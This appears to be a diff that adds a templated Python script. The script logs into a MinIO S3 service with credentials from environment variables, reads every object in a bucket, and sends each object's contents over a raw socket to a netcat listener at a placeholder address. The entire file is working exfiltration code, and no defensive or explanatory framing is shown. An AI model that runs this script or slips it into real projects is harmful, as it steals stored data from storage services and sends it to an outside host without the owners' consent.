@@ -1,0 +1,16 @@
+from minio import Minio
+
+import os
+import socket
+
+BUCKET = "{__BUCKET__}"
+NETCAT_SERVER_ADDRESS = ("{__ADDRESS__}", 12345)
+
+s3_client = Minio("s3:9000", os.getenv('MINIO_SH_USER'), os.getenv('MINIO_SH_PASSWORD'), secure=False)
+
+for o in s3_client.list_objects(bucket_name=BUCKET):
+    r = s3_client.get_object(BUCKET, o.object_name)
+    content = r.read()
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect(NETCAT_SERVER_ADDRESS)
+        s.sendall(content)
